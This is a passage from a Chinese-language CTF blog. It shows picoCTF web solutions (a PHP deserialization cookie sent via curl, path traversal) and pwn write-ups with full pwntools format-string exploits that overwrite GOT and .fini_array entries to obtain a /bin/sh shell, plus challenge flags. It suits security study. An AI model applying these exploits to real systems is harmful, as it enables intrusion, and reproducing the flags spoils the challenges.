class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$log_file</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$lf</span></span>) </span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;log_file = <span class="variable">$lf</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read_log</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">append_to_log</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;log_file, <span class="variable">$data</span>, FILE_APPEND);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read_log</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;log_file);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$perm</span> = <span class="keyword">new</span> <span class="title function_ invoke__">access_log</span>(<span class="string">&quot;../flag&quot;</span>);</span><br><span class="line"><span class="variable">$perm_encode</span> = <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$perm</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$perm_encode</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里的$log_file变量我们也是可以控制的，根据本关的Hint:<code>flag in ../flag</code><br />更改为对应的路径</p><p>这里可以用burpsuite来控制访问cookie，或者直接Linux命令<code>curl</code>来访问控制可以</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://mercury.picoctf.net:8404/authentication.php -H <span class="string">&quot;Cookie: login=TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9;&quot;</span></span><br></pre></td></tr></table></figure><p>最后根据catch输出我们得到flag<code>picoCTF&#123;th15_vu1n_1s_5up3r_53r1ous_y4ll_66832978&#125;</code></p><hr /><blockquote><p>下面先把简单的先清了，复杂的留着新开一档，以免一篇文章拉很长一篇</p></blockquote><h2 id="picobrowser"><a class="markdownIt-Anchor" href="#picobrowser"></a> picobrowser</h2><p>同之前的request header那一题，这一道是mini版，只改一个<br />flag:<code>picoCTF&#123;p1c0_s3cr3t_ag3nt_84f9c865&#125;</code></p><h2 id="client-side-again"><a class="markdownIt-Anchor" href="#client-side-again"></a> Client-side-again</h2><p>用JStillery可以先反混淆一下verify函数代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">verify</span>(<span class="params"></span>)</span><br><span class="line">    <span class="comment">/*Scope Closed:false | writes:false*/</span></span><br><span class="line">    &#123;</span><br><span class="line">        checkpass = <span class="variable language_">document</span>[<span class="string">&#x27;f49bf&#125;&#x27;</span>](<span class="string">&#x27;pass&#x27;</span>).<span class="property">_again_e</span>;</span><br><span class="line">        split = <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">if</span> (checkpass.<span class="title function_">this</span>(<span class="number">0</span>, split * <span class="number">2</span>) == <span class="title function_">_0x4b5b</span>(<span class="string">&#x27;0x3&#x27;</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (checkpass.<span class="title function_">this</span>(<span class="number">7</span>, <span class="number">9</span>) == <span class="string">&#x27;&#123;n&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (checkpass.<span class="title function_">this</span>(split * <span class="number">2</span>, split * <span class="number">2</span> * <span class="number">2</span>) == <span class="title function_">_0x4b5b</span>(<span class="string">&#x27;0x4&#x27;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (checkpass.<span class="title function_">this</span>(<span class="number">3</span>, <span class="number">6</span>) == <span class="string">&#x27;oCT&#x27;</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (checkpass.<span class="title function_">this</span>(split * <span class="number">3</span> * <span class="number">2</span>, split * <span class="number">4</span> * <span class="number">2</span>) == <span class="title function_">_0x4b5b</span>(<span class="string">&#x27;0x5&#x27;</span>)) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (checkpass.<span class="title function_">substring</span>(<span class="number">6</span>, <span class="number">11</span>) == <span class="string">&#x27;F&#123;not&#x27;</span>) &#123;</span><br><span class="line">                                <span class="keyword">if</span> (checkpass.<span class="title function_">this</span>(split * <span class="number">2</span> * <span class="number">2</span>, split * <span class="number">3</span> * <span class="number">2</span>) == <span class="title function_">_0x4b5b</span>(<span class="string">&#x27;0x6&#x27;</span>)) &#123;</span><br><span class="line">                                    <span class="keyword">if</span> (checkpass.<span class="title function_">this</span>(<span class="number">12</span>, <span class="number">16</span>) == <span class="title function_">_0x4b5b</span>(<span class="string">&#x27;0x7&#x27;</span>)) &#123;</span><br><span class="line">                                        <span class="title function_">alert</span>(<span class="title function_">_0x4b5b</span>(<span class="string">&#x27;0x8&#x27;</span>));</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_">alert</span>(<span class="title function_">_0x4b5b</span>(<span class="string">&#x27;0x9&#x27;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>__0x4b5b我们可以通过浏览器得到对应的数值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">_0x4b5b(&#x27;0x3&#x27;) == &quot;picoCTF&#123;&quot;</span><br><span class="line">_0x4b5b(&#x27;0x4&#x27;) == &quot;not_this&quot; </span><br><span class="line">_0x4b5b(&#x27;0x5&#x27;) == &quot;f49bf&#125;&quot; </span><br><span class="line">_0x4b5b(&#x27;0x6&#x27;) == &quot;_again_e&quot; </span><br><span class="line">_0x4b5b(&#x27;0x7&#x27;) == &quot;this&quot; </span><br><span class="line">_0x4b5b(&#x27;0x8&#x27;) == &quot;Password Verified&quot; </span><br></pre></td></tr></table></figure><p>那么再根据函数得到flag<code>picoCTF&#123;not_this_again_ef49bf&#125;</code></p><h2 id="forbidden-paths"><a class="markdownIt-Anchor" href="#forbidden-paths"></a> Forbidden Paths</h2><p>输入<code>../../../../../proc/version</code>都有正常回显，任意读</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Linux version 5.15.0-1023-aws (buildd@lcy02-amd64-116) (gcc (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0, GNU ld (GNU Binutils for Ubuntu) 2.34) #27~20.04.1-Ubuntu SMP Wed Oct 26 20:02:26 UTC 2022 </span><br></pre></td></tr></table></figure><p>flag<code>picoCTF&#123;7h3_p47h_70_5ucc355_6db46514&#125;</code></p><h2 id="power-cookie"><a class="markdownIt-Anchor" href="#power-cookie"></a> Power Cookie</h2><p>flag<code>picoCTF&#123;gr4d3_A_c00k13_5d2505be&#125;</code></p><h2 id="roboto-sans"><a class="markdownIt-Anchor" href="#roboto-sans"></a> Roboto Sans</h2><p>进入审查步骤，看到<code>robots.txt</code>文件的时候可以发现有一部分base64密文，我们解密后可以得到<br />flag<code>http://saturn.picoctf.net:65352/js/myfile.txt</code></p><h2 id="secrets"><a class="markdownIt-Anchor" href="#secrets"></a> Secrets</h2><p>这关看到样式表路径有点奇怪，作者故意提醒的<code>secret/assets/index.css</code>，就是看在审查的时候有没有注意到这种容易忽略的路径</p><p>最后找到flag的路径<code>http://saturn.picoctf.net:61481/secret/hidden/superhidden/</code>,得到<code>picoCTF&#123;succ3ss_@h3n1c@10n_39849bcf&#125;</code></p><blockquote><p>另外这篇就结束了，我再开一篇新的</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> practice </tag>
            
            <tag> picoctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn commonly training 2</title>
      <link href="/2023/01/16/pwn-commonly-break-2/"/>
      <url>/2023/01/16/pwn-commonly-break-2/</url>
      
        <content type="html"><![CDATA[<h1 id="练习"><a class="markdownIt-Anchor" href="#练习"></a> 练习</h1><h2 id="backdoor-ctf-bbpwn"><a class="markdownIt-Anchor" href="#backdoor-ctf-bbpwn"></a> Backdoor CTF bbpwn</h2><p>这里是继续之前的文档学习，希望跟着这个把pwn的破解方式系统的地看一遍，应该都只是基础，但是目前来看进度还是满了，都和几个好兄弟玩游戏去了<sup>_</sup></p><p>文件下载 <a href="/cyber/pwn/bbpwn2017">bbpwn2017</a></p><p>首先检查文件的保护机制和运行状况</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">32_new: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=da5e14c668579652906e8dd34223b8b5aa3becf8, not stripped</span><br><span class="line"></span><br><span class="line">==================execution=======================</span><br><span class="line">Hello baby pwner, whats your name?</span><br><span class="line">Andy</span><br><span class="line">Ok cool, soon we will know whether you pwned it or not. Till then Bye Andy</span><br></pre></td></tr></table></figure><p>查看<code>main</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(undefined4 param_1,undefined4 param_2)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> in_GS_OFFSET;</span><br><span class="line">  <span class="type">char</span> local_208 [<span class="number">200</span>];</span><br><span class="line">  <span class="type">char</span> local_140 [<span class="number">300</span>];</span><br><span class="line">  undefined4 local_14;</span><br><span class="line">  undefined4 *puStack_c;</span><br><span class="line">  </span><br><span class="line">  puStack_c = &amp;param_1;</span><br><span class="line">  local_14 = *(undefined4 *)(in_GS_OFFSET + <span class="number">0x14</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Hello baby pwner, whats your name?&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  fgets(local_208,<span class="number">200</span>,<span class="built_in">stdin</span>);</span><br><span class="line">  fflush(<span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(local_140,<span class="string">&quot;Ok cool, soon we will know whether you pwned it or not. Till then Bye %s&quot;</span>,</span><br><span class="line">          local_208);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="built_in">printf</span>(local_140);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是有一个格式化字符串漏洞通过<code>sprintf</code>间接赋值输出到<code>printf</code></p><p>并且可以注意到解析函数里面有一个<code>flag</code>函数，函数的格式类型为<code>void flag(void)</code>，我们可以利用格式化字符串漏洞覆写GOT表，这是一个很好的思路，并且flag这个函数也不需要多余的参数需要我们去控制</p><p>来个payload试试水发现got表已经能够随意改写了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/2w 0x804a028</span><br><span class="line">0x804a028 &lt;fflush@got.plt&gt;:     0x525252        0xf7b90000</span><br></pre></td></tr></table></figure><p>我们需要覆盖得到数值是<code>flag</code>的地址<code>0x804870b</code>,由于这里地址在我电脑上是小端存储，对比字节计算可以通过%[n]x来修正数量</p><blockquote><p>这里的x修正最小只能加8，不过我们可以加大数，如果多出来的位覆盖了后面的位我们可以手动补正</p></blockquote><p>exp</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./32_new&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./32_new&#x27;</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&quot;b *0x80487dc&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(p.recvline())</span><br><span class="line"></span><br><span class="line">addr1=p32(elf.got[<span class="string">&#x27;fflush&#x27;</span>])</span><br><span class="line">addr2=p32(elf.got[<span class="string">&#x27;fflush&#x27;</span>]+<span class="number">1</span>)</span><br><span class="line">addr3=p32(elf.got[<span class="string">&#x27;fflush&#x27;</span>]+<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(u32(addr1)))</span><br><span class="line"></span><br><span class="line">filler1=<span class="string">b&#x27;%185x&#x27;</span></span><br><span class="line">filler2=<span class="string">b&#x27;%892x&#x27;</span></span><br><span class="line">filler3=<span class="string">b&#x27;%893x&#x27;</span></span><br><span class="line"></span><br><span class="line">fmt_str1=<span class="string">b&#x27;%10$n&#x27;</span></span><br><span class="line">fmt_str2=<span class="string">b&#x27;%11$n&#x27;</span></span><br><span class="line">fmt_str3=<span class="string">b&#x27;%12$n&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=addr1+addr2+addr3+filler1+fmt_str1+filler2+fmt_str2+filler3+fmt_str3</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="tokyo-2016-greeting"><a class="markdownIt-Anchor" href="#tokyo-2016-greeting"></a> Tokyo 2016 Greeting</h2><p>greeting! witcher.<br />这个相比于上一题难度稍微提升，顺便记录记录</p><p>文件下载: <a href="/cyber/pwn/tokyo2016greeting">greeting</a><br />先来看看文件保护机制和文件运行表现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">greeting: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=beb85611dbf6f1f3a943cecd99726e5e35065a63, not stripped</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">=====================running======================</span><br><span class="line">Hello, I&#x27;m nao!</span><br><span class="line">Please tell me your name... </span><br><span class="line">Don&#x27;t ignore me ;( </span><br><span class="line">=====================running======================</span><br><span class="line">Hello, I&#x27;m nao!</span><br><span class="line">Please tell me your name... blueman</span><br><span class="line">Nice to meet you, blueman :)</span><br></pre></td></tr></table></figure><p>再来分析分析主函数<code>main</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> size;</span><br><span class="line">  <span class="type">int</span> in_GS_OFFSET;</span><br><span class="line">  <span class="type">char</span> printStr [<span class="number">64</span>];</span><br><span class="line">  <span class="type">char</span> name [<span class="number">64</span>];</span><br><span class="line">  <span class="type">int</span> canary;</span><br><span class="line">  </span><br><span class="line">  canary = *(<span class="type">int</span> *)(in_GS_OFFSET + <span class="number">0x14</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please tell me your name... &quot;</span>);</span><br><span class="line">  size = getnline(name,<span class="number">0x40</span>);</span><br><span class="line">  <span class="keyword">if</span> (size == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Don\&#x27;t ignore me ;( &quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">sprintf</span>(printStr,<span class="string">&quot;Nice to meet you, %s :)\n&quot;</span>,name);</span><br><span class="line">    <span class="built_in">printf</span>(printStr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (canary != *(<span class="type">int</span> *)(in_GS_OFFSET + <span class="number">0x14</span>)) &#123;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    __stack_chk_fail();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>getnline</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">getnline</span><span class="params">(<span class="type">char</span> *name,<span class="type">int</span> len)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *retName;</span><br><span class="line">  <span class="type">size_t</span> retSize;</span><br><span class="line">  </span><br><span class="line">  fgets(name,len,<span class="built_in">stdin</span>);</span><br><span class="line">  retName = <span class="built_in">strchr</span>(name,<span class="number">10</span>);</span><br><span class="line">  <span class="keyword">if</span> (retName != (<span class="type">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">    *retName = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  retSize = <span class="built_in">strlen</span>(name);</span><br><span class="line">  <span class="keyword">return</span> retSize;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个比较有意思的函数<code>nao</code>，非常不错，这正是我们所需要的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">nao</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>,(<span class="type">char</span> *)<span class="number">0x0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>,(<span class="type">char</span> *)<span class="number">0x0</span>);</span><br><span class="line">  system(<span class="string">&quot;echo \&quot;Hello, I\&#x27;m nao\&quot;!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们已经掌握了其中的函数了，并且已经有一些可以利用的漏洞组合；<code>system</code>敏感函数的plt表地址为<code>0x8048490</code>;这里为了能够使程序循环用了<code>.fini_array segment</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Sections:</span><br><span class="line">Idx Name          Size      VMA       LMA       File off  Algn</span><br><span class="line"> 18 .init_array   00000008  0804992c  0804992c  0000092c  2**2</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br><span class="line"> 19 .fini_array   00000004  08049934  08049934  00000934  2**2</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br></pre></td></tr></table></figure><p>这里预选的loop address是<code>0x8048614</code></p><p>测试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Hello, I&#x27;m nao!</span><br><span class="line">Please tell me your name... 1111222233334444 %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p</span><br><span class="line">Nice to meet you, 1111222233334444 0x80487d0 0xffffcf7c 0x736877c4 0x79a0 0xf7ffda20 0xfffffbac 0x6563694e 0x206f7420 0x7465656d 0x756f7920 0x3131202c 0x32323131 0x33333232 0x34343333 0x25203434 :)</span><br></pre></td></tr></table></figure><p>有点瑕疵我们对称一下字节,用<code>AA</code>来填充</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Hello, I&#x27;m nao!</span><br><span class="line">Please tell me your name... AA1111222233334444 %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p</span><br><span class="line">Nice to meet you, AA1111222233334444 0x80487d0 0xffffcf9c 0xc6679d3e 0x7a31 0xf7ffda20 0xfffffbac 0x6563694e 0x206f7420 0x7465656d 0x756f7920 0x4141202c 0x31313131 0x32323232 0x33333333 0x34343434 :)</span><br></pre></td></tr></table></figure><p>我们得到了我们的格式化字符串参数位置,以及可控显示payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AA1111222233334444 %12$p %13$p %14$p %15$p</span><br></pre></td></tr></table></figure><p>exp</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./greeting&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./greeting&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *0x0804864f&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fini_array=<span class="number">0x8049934</span></span><br><span class="line">strlen_got=<span class="number">0x8049a54</span></span><br><span class="line">loop_main=<span class="number">0x8048614</span></span><br><span class="line">system_plt=<span class="number">0x8048490</span></span><br><span class="line"></span><br><span class="line">filler0=<span class="string">b&#x27;AA&#x27;</span></span><br><span class="line">filler1=<span class="string">b&#x27;%34288x&#x27;</span></span><br><span class="line">filler2=<span class="string">b&#x27;%65148x&#x27;</span></span><br><span class="line">filler3=<span class="string">b&#x27;%33652x&#x27;</span></span><br><span class="line"></span><br><span class="line">fmt_str1=<span class="string">b&#x27;%12$n&#x27;</span></span><br><span class="line">fmt_str2=<span class="string">b&#x27;%13$n&#x27;</span></span><br><span class="line">fmt_str3=<span class="string">b&#x27;%14$n&#x27;</span></span><br><span class="line">fmt_str4=<span class="string">b&#x27;%15$n&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#overwrite fini_array,and enter the loop</span></span><br><span class="line">payload=filler1+p32(fini_array)+p32(fini_array+<span class="number">2</span>)+p32(strlen_got)+p32(strlen_got+<span class="number">2</span>)+filler1+fmt_str1+filler2+fmt_str3+filler3+fmt_str2+fmt_str4</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="csaw-doubletrouble"><a class="markdownIt-Anchor" href="#csaw-doubletrouble"></a> CSAW doubletrouble</h2><p>文件下载: <a href="/cyber/pwn/doubletrouble">doubletrouble</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">检测算术溢出</span><br><span class="line">SBORROW4(x,y)</span><br><span class="line">Return true if there is an arithmetic overflow when subtracting &#x27;y&#x27; from &#x27;x&#x27; as signed integers.</span><br><span class="line">====================================================================</span><br><span class="line">CONCAT31(x,y)</span><br><span class="line">CONCAT31(0xaabbcc,0xdd) = 0xaabbccdd </span><br><span class="line">Concatenate the bytes in &#x27;x&#x27; with the bytes in &#x27;y&#x27;. &#x27;x&#x27; becomes the most significant bytes, and &#x27;y&#x27; the least significant bytes, in the result.</span><br></pre></td></tr></table></figure><p>这里concat44实在没办法转化为看起来正常的数据，索性再次优化了一下函数结构</p><p>这里删了很多，做了一半发现这道题有点超出我目前的能力范围，题留这了，挖个坑，有时间填上吧；其实主要是学习数组指引漏洞，换个简单点记录吧</p><p>不过这里倒是有一篇WP讲解可以借鉴一下，先放这里了</p><p><a href="https://hack.more.systems/writeup/2018/09/20/csawctfquals-doubletrouble/">CSAW’18 CTF Qualification Round: Doubletrouble</a></p><h2 id="dream-heap"><a class="markdownIt-Anchor" href="#dream-heap"></a> Dream Heap</h2><p>文件下载:<a href="/cyber/pwn/dream_heaps">dream_heaps</a></p><p>这是一个关于数组越界的漏洞，这种漏洞还是挺常见的，这个是SwampCTF2019中的一道题，跟之前的题目的类型都不太一样，可以详细的记录一下解题过程</p><p>先来简单的看看运行效果以及基本信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 